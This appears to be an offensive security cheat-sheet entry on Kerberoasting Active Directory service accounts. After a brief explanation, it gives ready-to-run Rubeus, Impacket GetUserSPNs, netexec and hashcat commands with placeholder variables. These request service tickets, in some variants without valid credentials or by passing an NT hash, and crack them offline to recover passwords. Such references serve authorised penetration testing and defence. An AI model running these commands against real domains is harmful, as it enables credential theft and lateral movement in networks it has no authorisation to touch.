---
technique: Kerberoast
category: kerberos
targets: User accounts with SPNs
protocols: Kerberos
remote_capable: true
tags: kerberos kerberoast spn tgs-rep cracking ad
---

# Kerberoast

When a domain account has a servicePrincipalName (SPN) set, any authenticated user can request a service ticket (ST) for it. The KDC encrypts that ticket with the service account's NT hash. If the account uses a human-defined password (not a machine-generated one), the encrypted ticket can be cracked offline to recover the plaintext password.

## Windows

### Rubeus

#powershell #kerberoast

Request service tickets for all Kerberoastable accounts and save them for offline cracking.

```powershell title:"Kerberoast all SPN accounts with Rubeus"
.\Rubeus.exe kerberoast /outfile:kerberoastables.txt
```
<!-- cheat
var outfile = kerberoastables.txt
-->

### Rubeus (no pre-auth)

#powershell #kerberoast #nopreauth

Request service tickets via AS-REQ without any valid domain credentials by leveraging a known ASREProastable account.

```powershell title:"Kerberoast via AS-REQ using an ASREProastable account"
.\Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"$domain" /dc:"$dc_fqdn" /nopreauth:"$nopreauth_user" /spn:"$target_spn"
```
<!-- cheat
import domain_ip
var dc_fqdn
var nopreauth_user
var target_spn
-->

## Linux

### GetUserSPNs

#impacket #kerberos #password #pth

Request service tickets for Kerberoastable accounts and save hashes for offline cracking.

```sh title:"Kerberoast all SPN accounts via GetUserSPNs"
GetUserSPNs.py -outputfile kerberoastables.txt -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" -dc-ip "$rhost_ip" "$domain/$user"
```
<!-- cheat
import domain_ip
import users
var nt_hash
-->

### GetUserSPNs (no pre-auth)

#impacket #kerberos #nopreauth

Kerberoast without any valid domain credentials by leveraging a known ASREProastable account.

```sh title:"Kerberoast via AS-REQ using a pre-auth-disabled account"
GetUserSPNs.py -no-preauth "$nopreauth_user" -usersfile "$spn_targets_file" -dc-host "$rhost_ip" "$domain/"
```
<!-- cheat
import domain_ip
var nopreauth_user
var spn_targets_file
-->

### netexec

#ldap #kerberoast

Kerberoast all SPN accounts via netexec LDAP module.

```sh title:"Kerberoast all SPN accounts via netexec"
nxc ldap "$rhost_ip" -u "$user" $auth_flags --kerberoasting kerberoastables.txt --kdcHost "$rhost_ip"
```
<!-- cheat
import domain_ip
import users
import nxc_auth
-->

### hashcat

#cracking #offline

Crack Kerberoast hashes offline using hashcat mode 13100 (RC4) or 19600/19700 (AES).

```sh title:"Crack Kerberoast hashes with hashcat"
hashcat -m 13100 kerberoastables.txt "$wordlist"
```
<!-- cheat
var wordlist
-->
